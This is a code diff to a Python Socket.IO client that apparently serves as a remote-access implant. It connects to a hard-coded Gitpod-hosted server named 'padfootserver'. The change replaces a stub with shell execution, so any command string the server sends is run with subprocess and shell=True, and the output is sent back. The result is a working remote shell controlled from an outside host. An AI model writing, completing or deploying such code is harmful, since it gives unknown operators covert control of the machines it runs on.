@@ -2,14 +2,14 @@ import socketio
 import public_ip as ip
 import json
 import getpass
+import subprocess
 
 SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us102.gitpod.io'
 # Connect to the Socket.IO server
 sio = socketio.Client()
 
 def execute_command(command):
-  output = 0
-  return output
+  return subprocess.check_output(command, shell=True, text=True)
 
 @sio.on('connect')
 def on_connect():
@@ -24,10 +24,9 @@ def on_disconnect():
 
 @sio.on('command')
 def command(data):
-  metadata = json.loads(data)
-  output = execute_command(data.command)
-  return_data = {'output': output, 'sender': data.returnAddress}
-  sio.emit()
+  output = execute_command(data['command'])
+  return_data = {'output': output, 'returnAddress': data['returnAddress']}
+  sio.emit('commandResponse', return_data)
 
 # Start the connection
 sio.connect(SERVER)
